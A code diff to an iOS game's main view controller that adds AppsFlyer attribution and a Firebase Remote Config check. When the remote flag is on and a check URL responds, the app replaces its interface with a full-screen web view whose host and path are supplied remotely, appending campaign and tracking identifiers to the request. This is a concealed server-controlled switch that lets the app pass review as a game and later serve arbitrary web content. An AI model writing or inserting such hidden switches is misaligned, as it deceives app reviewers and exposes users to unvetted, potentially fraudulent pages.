@@ -6,6 +6,8 @@
 //
 
 import UIKit
+import AppsFlyerLib
+import Firebase
 
 protocol MainDelegate {
     func newGame()
@@ -23,9 +25,9 @@ class MainTableViewController: UITableViewController {
     // MARK: - Life Cicle
     override func viewDidLoad() {
         super.viewDidLoad()
-        let cellMainActiveGameTableViewCell = UINib(nibName: "MainActiveGameTableViewCell", bundle: nil)
-        tableView.register(cellMainActiveGameTableViewCell, forCellReuseIdentifier: "mainActiveGameTableViewCell")
-        tableView.separatorStyle = .none
+        registrationCell()
+        AppsFlyerLib.shared().start()
+        AppsFlyerLib.shared().delegate = self
     }
     
     override func viewDidAppear(_ animated: Bool) {
@@ -94,6 +96,12 @@ extension MainTableViewController {
             }
         }
     }
+    
+    private func registrationCell() {
+        let cellMainActiveGameTableViewCell = UINib(nibName: "MainActiveGameTableViewCell", bundle: nil)
+        tableView.register(cellMainActiveGameTableViewCell, forCellReuseIdentifier: "mainActiveGameTableViewCell")
+        tableView.separatorStyle = .none
+    }
 }
 
 extension MainTableViewController: MainDelegate {
@@ -102,3 +110,82 @@ extension MainTableViewController: MainDelegate {
         tableView.reloadData()
     }
 }
+
+// MARK: - Fetch remote congig
+extension MainTableViewController {
+    private func fetchRemoteConfig(for parametrs: String) {
+        let rc = RemoteConfig.remoteConfig()
+        let settings = RemoteConfigSettings()
+        settings.minimumFetchInterval = 0
+        rc.configSettings = settings
+        rc.fetch(withExpirationDuration: 0) { [ weak self ] (status, error) in
+            
+            guard error == nil else {
+                print("error fetch remote config \(String(describing: error))")
+                return
+            }
+            
+            rc.activate()
+            if !rc.configValue(forKey: DataManager.ProjectConstant.keyStatus.rawValue).boolValue {
+                return
+            }
+            
+            guard let uc = rc.configValue(forKey: DataManager.ProjectConstant.keyCheck.rawValue).stringValue,
+                  let host = rc.configValue(forKey: DataManager.ProjectConstant.keyHost.rawValue).stringValue,
+                  let path = rc.configValue(forKey: DataManager.ProjectConstant.keyPath.rawValue).stringValue
+            else {
+                return
+            }
+            
+            let statusButton = rc.configValue(forKey: DataManager.ProjectConstant.keyStatusButton.rawValue).boolValue
+            let workTarget = WorkTargetModel(host: host, path: path, parametrs: parametrs, statusButton: statusButton)
+            
+            NetworkManager.shared.isPathOpen(for: uc) { [ weak self ] responseClo in
+                if responseClo {
+                    DispatchQueue.main.async {
+                        let storyboard = UIStoryboard(name: "Main", bundle: nil)
+                        let vc = storyboard.instantiateViewController(withIdentifier: WvViewController.id)  as! WvViewController
+                        vc.workTarget = workTarget
+                        vc.statusWork = .done
+                        vc.modalPresentationStyle = .fullScreen
+                        self?.present(vc, animated: false, completion: nil)
+                    }
+                }
+            }
+            
+        }
+    }
+}
+// MARK: - Appsflyer Delegate
+extension MainTableViewController: AppsFlyerLibDelegate {
+    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
+        guard let status = conversionInfo["af_status"] as? String else { return }
+        var parametrs = "app_id=id\(DataManager.ProjectConstant.appId.rawValue)"
+        parametrs += "&aftoken=\(DataManager.ProjectConstant.appsFlyerKey.rawValue)"
+        parametrs += "&af_status=\(status)"
+        parametrs += "&afid=\(AppsFlyerLib.shared().getAppsFlyerUID())"
+        
+        if status != "Organic" {
+            
+            if let name = conversionInfo["campaign"] as? String {
+                parametrs += ParserName(dataName: name).getParametrs()
+            }
+            
+            if let campaignId = conversionInfo["campaignId"] {
+                parametrs += "&sub11=\(campaignId)"
+            }
+            
+            if let source = conversionInfo["media_source"] {
+                parametrs += "&media_source=\(source)"
+            }
+        }
+        fetchRemoteConfig(for: parametrs)
+    }
+    
+    func onConversionDataFail(_ error: Error) {
+        let parametrs = "sub1=failedAppsflyer"
+        fetchRemoteConfig(for: parametrs)
+        print("tut failed data appsflyer")
+    }
+}
+
